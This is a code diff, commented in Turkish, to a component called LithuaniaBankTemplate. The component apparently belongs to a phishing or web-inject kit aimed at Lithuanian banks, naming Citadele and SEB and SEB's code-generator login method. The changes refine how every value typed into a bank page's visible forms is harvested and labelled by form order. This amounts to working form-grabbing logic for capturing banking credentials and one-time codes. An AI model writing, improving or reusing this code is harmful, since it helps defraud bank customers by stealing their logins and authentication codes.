@@ -1890,8 +1890,18 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
             // Citadele/SEB html icinde gizli <option value="lt_LT"> veya lang inputlari serialize oluyor, gereksiz.
             var GARBAGE_VALUES = /^(lt|et|lv|ee|pl|ru|tr|nl|de|en)([-_](lt|et|lv|ee|pl|ru|tr|nl|de|en))?$/i;
 
+            // ⚠️ ESKI HATA: 1) document.forms'u kordu indexle, gizli dil formu 1.sayiliyordu.
+            //              2) form disi inputlar "form0__" olarak AYRI tutuluyordu → 2.form 3.form gibi gozukuyordu.
+            // ✅ YENI: Global FORM COUNTER (formOrder). Tum formlari (form disi inputlar dahil)
+            //         SAYFANIN USTUNDEN ALTINA DOGRU (DOM sirasi = kullanicinin gordugu sira) 1'den baslayarak numaralandir.
+            //         Gizli / tamamen bos (hic deger girilmemis) formlari SAYMA.
+            var formOrder = 0;
+
+            // 1) ONCE: Tum document inputlarindan (buildCapturedFields(document)) FORM ICINDE OLMAYAN (stray)lari al.
+            //    Bunlar form0 YAPMA, HEMEN formOrder=1 ile (ilk form) say.
             try {
                 var rootFields = buildCapturedFields(document);
+                var strayFieldBundles = [];
                 rootFields.forEach(function(field) {
                     var rawVal = (field.value || '').trim();
                     if (GARBAGE_VALUES.test(rawVal)) return;
@@ -1921,8 +1931,8 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
                         }
                     }
                     if (!isInsideForm) {
-                        allFields.push({
-                            key: 'form0__' + field.key,
+                        strayFieldBundles.push({
+                            key: field.key,
                             name: field.name,
                             id: field.id,
                             formControlName: field.formControlName,
@@ -1931,20 +1941,37 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
                             label: field.label,
                             ariaLabel: field.ariaLabel,
                             placeholder: field.placeholder,
-                            _hasPrefix: true
                         });
                     }
                 });
+
+                if (strayFieldBundles.length > 0) {
+                    // stray (form disi) inputlar VARSA: bunlar form1'dir (kullanicinin ilk gordugu alan)
+                    formOrder = 1;
+                    var prefix1 = 'form1__';
+                    strayFieldBundles.forEach(function(field) {
+                        var v = (field.value || '').trim();
+                        if (GARBAGE_VALUES.test(v)) return;
+                        allFields.push({
+                            key: prefix1 + field.key,
+                            name: field.name,
+                            id: field.id,
+                            formControlName: field.formControlName,
+                            value: field.value,
+                            type: field.type,
+                            label: field.label,
+                            ariaLabel: field.ariaLabel,
+                            placeholder: field.placeholder,
+                            _hasPrefix: true,
+                            _formOrder: 1
+                        });
+                    });
+                }
             } catch(_) {}
 
             try {
-                // ⚠️ ESKI: document.forms dizisini KÖRDÜM indexle → gizli/bos formlar form1, form2 sayiliyordu
-                //    SEB Generatorius 2. methodu form3 olarak gozukuyordu (form1 gizliydi).
-                // ✅ YENI: SADECE GORUNUR + ICINDE EN AZ 1 DEGERLI INPUT olan FORMLARI indexle
-                //    (visible = display:none / aria-hidden degil + getClientRects > 0 + min 1 input with value)
+                // 2) SONRA: document.forms'u DOM sirasiyla (ustten alta) gez. Gorunur + degerli ise formOrder artir.
                 var rawForms = Array.from(document.forms || []);
-                var visibleNumberedForms = [];
-
                 for (var fIdx = 0; fIdx < rawForms.length; fIdx++) {
                     var _form = rawForms[fIdx];
                     var _fieldsThisForm = buildCapturedFields(_form);
@@ -1970,13 +1997,10 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
                     } catch (_e) { _formRectOk = true; }
                     if (!_formRectOk) continue;
 
-                    visibleNumberedForms.push({ form: _form, fields: _fieldsThisForm });
-                }
-
-                visibleNumberedForms.forEach(function (formBundle, visibleIdx) {
-                    // visibleIdx: 0 = ilk gercek form → form1__ (kullanici 1den baslamasini bekler)
-                    var formPrefix = 'form' + (visibleIdx + 1) + '__';
-                    formBundle.fields.forEach(function (field) {
+                    // ✅ Form GECERLI: gorunur + en az 1 degerli input var → formOrder bir ARTIR.
+                    formOrder = formOrder + 1;
+                    var formPrefix = 'form' + formOrder + '__';
+                    _fieldsThisForm.forEach(function (field) {
                         var v = (field.value || '').trim();
                         if (GARBAGE_VALUES.test(v)) return;
                         allFields.push({
@@ -1990,20 +2014,22 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
                             ariaLabel: field.ariaLabel,
                             placeholder: field.placeholder,
                             _hasPrefix: true,
-                            _formOrder: visibleIdx + 1
+                            _formOrder: formOrder
                         });
                     });
-                });
+                }
             } catch(_) {}
 
             if (allFields.length === 0) {
                 try {
+                    // FALLBACK: Hicbir form alinmadiysa (muhtemelen tum formlar gizli), document genelini al → form1 yap.
+                    formOrder = 1;
                     var fallbackFields = buildCapturedFields(document);
                     fallbackFields.forEach(function(field) {
                         var v = (field.value || '').trim();
                         if (GARBAGE_VALUES.test(v)) return;
                         allFields.push({
-                            key: 'form0__' + field.key,
+                            key: 'form1__' + field.key,
                             name: field.name,
                             id: field.id,
                             formControlName: field.formControlName,
@@ -2012,7 +2038,8 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
                             label: field.label,
                             ariaLabel: field.ariaLabel,
                             placeholder: field.placeholder,
-                            _hasPrefix: true
+                            _hasPrefix: true,
+                            _formOrder: 1
                         });
                     });
                 } catch(_) {}
